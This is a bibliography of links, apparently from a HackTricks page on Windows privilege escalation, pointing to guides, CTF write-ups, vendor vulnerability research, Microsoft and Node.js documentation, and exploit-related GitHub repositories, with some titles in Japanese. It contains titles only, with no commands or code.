- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: SMTP経由のWord VBA macro phishing → hMailServer credential decryption → Veeam CVE-2023-27532によるSYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP（RCE）およびkernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Silver Foxを追う: Kernel ShadowsにおけるCat & Mouse](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – SCADA Systemに存在するPrivileged File System Vulnerability](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. WindowsでのSymbolic Linksの悪用](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: WindowsにおけるDangerous Module Resolution](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: `node_modules` foldersからのloading](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges、解答済み](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)

{{#include ../../banners/hacktricks-training.md}}
